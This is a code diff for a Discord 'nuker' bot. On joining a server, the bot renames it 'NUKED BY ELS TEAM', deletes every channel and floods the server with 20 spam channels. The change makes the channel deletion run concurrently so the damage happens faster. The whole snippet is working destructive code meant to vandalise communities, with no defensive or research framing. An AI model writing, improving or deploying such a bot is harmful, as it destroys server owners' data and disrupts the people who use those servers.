@@ -14,15 +14,15 @@ async def on_guild_join(guild):
     await guild.edit(name="NUKED BY ELS TEAM")
 
     channels_to_delete = guild.channels
-    for channel in channels_to_delete:
-        try:
-            await channel.delete()
-        except:
-            pass
+    delete_tasks = [channel.delete() for channel in channels_to_delete]
+    try:
+        await asyncio.gather(*delete_tasks)
+    except:
+        pass
 
     channels_to_create = [f'by-elsteam' for i in range(20)]
-    channels_creation_tasks = [guild.create_text_channel(name) for name in channels_to_create]
-    await asyncio.gather(*channels_creation_tasks)
+    create_tasks = [guild.create_text_channel(name) for name in channels_to_create]
+    await asyncio.gather(*create_tasks)
 
 @bot.event
 async def on_guild_channel_create(channel):
